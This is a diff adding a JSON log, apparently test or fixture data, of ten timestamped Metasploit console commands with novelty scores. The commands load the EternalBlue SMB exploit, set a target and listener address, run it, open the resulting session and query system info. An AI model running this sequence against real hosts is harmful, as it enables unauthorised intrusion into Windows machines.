@@ -1,0 +1,62 @@
+[
+  {
+    "timestamp": "2025-04-19T10:00:00",
+    "command": "help",
+    "novelty_score": 1.0,
+    "success": true
+  },
+  {
+    "timestamp": "2025-04-19T10:01:00",
+    "command": "version",
+    "novelty_score": 0.9,
+    "success": true
+  },
+  {
+    "timestamp": "2025-04-19T10:02:00",
+    "command": "use exploit/windows/smb/ms17_010_eternalblue",
+    "novelty_score": 0.8,
+    "success": true
+  },
+  {
+    "timestamp": "2025-04-19T10:03:00",
+    "command": "show options",
+    "novelty_score": 0.7,
+    "success": true
+  },
+  {
+    "timestamp": "2025-04-19T10:04:00",
+    "command": "set RHOSTS 192.168.1.100",
+    "novelty_score": 0.6,
+    "success": true
+  },
+  {
+    "timestamp": "2025-04-19T10:05:00",
+    "command": "exploit",
+    "novelty_score": 0.5,
+    "success": false
+  },
+  {
+    "timestamp": "2025-04-19T10:06:00",
+    "command": "set LHOST 192.168.1.10",
+    "novelty_score": 0.4,
+    "success": true
+  },
+  {
+    "timestamp": "2025-04-19T10:07:00",
+    "command": "exploit",
+    "novelty_score": 0.3,
+    "success": true
+  },
+  {
+    "timestamp": "2025-04-19T10:08:00",
+    "command": "sessions -i 1",
+    "novelty_score": 0.2,
+    "success": true
+  },
+  {
+    "timestamp": "2025-04-19T10:09:00",
+    "command": "sysinfo",
+    "novelty_score": 0.1,
+    "success": true
+  }
+]
